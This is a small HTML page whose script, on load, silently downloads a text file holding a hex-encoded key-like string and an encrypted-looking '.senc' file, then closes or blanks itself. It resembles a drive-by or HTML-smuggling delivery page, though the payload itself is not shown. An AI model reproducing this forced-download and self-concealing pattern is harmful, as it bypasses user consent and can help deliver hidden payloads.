<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>...</title>
</head>
<body>
<script>
(function () {
  // ===== Generate and download the TXT file =====
  const textContent = "3137373339353248484C3335";
  const blob = new Blob([textContent], { type: "text/plain" });
  const txtUrl = URL.createObjectURL(blob);

  const txtLink = document.createElement("a");
  txtLink.href = txtUrl;
  txtLink.download = "...";
  document.body.appendChild(txtLink);
  txtLink.click();
  document.body.removeChild(txtLink);
  URL.revokeObjectURL(txtUrl);

  // ===== Download the existing .senc file =====
  const sencLink = document.createElement("a");
  sencLink.href = "./7H3955LqO.senc";
  sencLink.download = "7H3955LqO.senc";
  document.body.appendChild(sencLink);
  sencLink.click();
  document.body.removeChild(sencLink);

  // ===== Attempt to close the page =====
  setTimeout(() => {
    window.close();

    // Fallback for browsers that block close()
    document.body.innerHTML = "";
  }, 300);
})();
</script>
</body>
</html>
